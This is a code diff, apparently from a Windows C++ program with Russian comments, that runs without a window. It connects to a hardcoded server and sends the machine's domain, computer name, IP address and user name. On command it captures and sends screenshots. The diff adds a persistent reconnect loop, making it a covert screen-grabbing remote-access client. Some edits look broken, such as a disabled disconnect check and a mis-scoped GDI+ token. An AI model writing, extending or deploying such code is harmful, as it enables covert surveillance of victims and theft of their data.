@@ -7,6 +7,7 @@
 #include <vector>
 #include <iphlpapi.h>
 #include <lm.h>
+#include <fstream>
 
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "gdiplus.lib")
@@ -35,12 +36,10 @@ std::string GetUserName() {
 }
 
 std::string GetDomainName() {
-    LPWSTR domain = nullptr;
-    NETSETUP_JOIN_STATUS status;
-    if (NetGetJoinInformation(nullptr, &domain, &status) == NERR_Success && status == NetSetupDomainName) {
-        std::wstring ws(domain);
-        NetApiBufferFree(domain);
-        return std::string(ws.begin(), ws.end());
+    char buffer[256]{};
+    DWORD size = sizeof(buffer);
+    if (GetComputerNameExA(ComputerNameDnsDomain, buffer, &size) && buffer[0] != '\0') {
+        return buffer;
     }
     return "WORKGROUP";
 }
@@ -66,26 +65,41 @@ std::string GetLocalIP() {
 }
 
 bool TakeScreenshot(std::vector<BYTE>& jpegData) {
+    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
+    ULONG_PTR gdiplusToken;
+    Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, nullptr);
+
     HDC hdcScreen = GetDC(nullptr);
-    HDC hdcMem = CreateCompatibleDC(hdcScreen);
-    
     int width = GetSystemMetrics(SM_CXSCREEN);
     int height = GetSystemMetrics(SM_CYSCREEN);
-    
+
+    HDC hdcMem = CreateCompatibleDC(hdcScreen);
     HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, width, height);
     SelectObject(hdcMem, hBitmap);
     BitBlt(hdcMem, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY);
-    
-    BITMAPINFOHEADER bi = { sizeof(bi), width, height, 1, 24, BI_RGB };
-    jpegData.resize(width * height * 3);
-    GetDIBits(hdcScreen, hBitmap, 0, height, jpegData.data(), (BITMAPINFO*)&bi, DIB_RGB_COLORS);
-    
+
+    Gdiplus::Bitmap bitmap(hBitmap, nullptr);
+    IStream* stream = nullptr;
+    CreateStreamOnHGlobal(nullptr, TRUE, &stream);
+
+    CLSID clsidJpeg;
+    CLSIDFromString(L"{557CF401-1A04-11D3-9A73-0000F81EF32E}", &clsidJpeg); // CLSID для JPEG
+    bitmap.Save(stream, &clsidJpeg, nullptr);
+
+    STATSTG stat;
+    stream->Stat(&stat, STATFLAG_NONAME);
+    jpegData.resize(stat.cbSize.LowPart);
+    LARGE_INTEGER seekPos = {0};
+    stream->Seek(seekPos, STREAM_SEEK_SET, nullptr);
+    stream->Read(jpegData.data(), jpegData.size(), nullptr);
+
+    stream->Release();
     DeleteObject(hBitmap);
     DeleteDC(hdcMem);
     ReleaseDC(nullptr, hdcScreen);
+    Gdiplus::GdiplusShutdown(gdiplusToken);
     return true;
 }
-
 void SendScreenshot(SOCKET sock) {
     std::vector<BYTE> imageData;
     if (TakeScreenshot(imageData)) {
@@ -108,11 +122,11 @@ void MessageHandler(SOCKET sock) {
     char buffer[4096];
     while (running) {
         int bytes = recv(sock, buffer, sizeof(buffer), 0);
-        if (bytes <= 0) {
+/*        if (bytes <= 0) {
             running = false;
             break;
         }
-        
+*/        
         if (bytes >= 4 && strncmp(buffer, "SCRN", 4) == 0) {
             SendScreenshot(sock);
         }
@@ -127,33 +141,36 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
     WSADATA wsaData;
     WSAStartup(MAKEWORD(2, 2), &wsaData);
 
-    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-    sockaddr_in serverAddr{};
-    serverAddr.sin_family = AF_INET;
-    serverAddr.sin_port = htons(SERVER_PORT);
-    inet_pton(AF_INET, SERVER_IP, &serverAddr.sin_addr);
+    while (running) {
+        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+        sockaddr_in serverAddr{};
+        serverAddr.sin_family = AF_INET;
+        serverAddr.sin_port = htons(SERVER_PORT);
+        inet_pton(AF_INET, SERVER_IP, &serverAddr.sin_addr);
 
-    if (connect(sock, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
-        return 1;
+        if (connect(sock, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
+            closesocket(sock);
+            std::this_thread::sleep_for(std::chrono::seconds(5)); // Ждём 5 секунд перед повторной попыткой
+            continue;
+        }
+
+        std::string clientInfo = GetDomainName() + "|" + GetComputerName() + "|" + GetLocalIP() + "|" + GetUserName();
+        send(sock, clientInfo.c_str(), clientInfo.size() + 1, 0);
+
+        std::thread keepAlive(KeepAliveLoop, sock);
+        std::thread handler(MessageHandler, sock);
+        keepAlive.detach();
+        handler.detach();
+
+        MSG msg;
+        while (running && GetMessage(&msg, nullptr, 0, 0)) {
+            TranslateMessage(&msg);
+            DispatchMessage(&msg);
+        }
+
+        closesocket(sock);
+        std::this_thread::sleep_for(std::chrono::seconds(1)); // Задержка перед переподключением
     }
-
-    std::string clientInfo = GetDomainName() + "|" + GetComputerName() + "|" + 
-                           GetLocalIP() + "|" + GetUserName();
-    send(sock, clientInfo.c_str(), clientInfo.size() + 1, 0);
-
-    std::thread keepAlive(KeepAliveLoop, sock);
-    std::thread handler(MessageHandler, sock);
-    keepAlive.detach();
-    handler.detach();
-
-    MSG msg;
-    while (running && GetMessage(&msg, nullptr, 0, 0)) {
-        TranslateMessage(&msg);
-        DispatchMessage(&msg);
-    }
-
-    running = false;
-    closesocket(sock);
     WSACleanup();
     GdiplusShutdown(gdiplusToken);
     return 0;
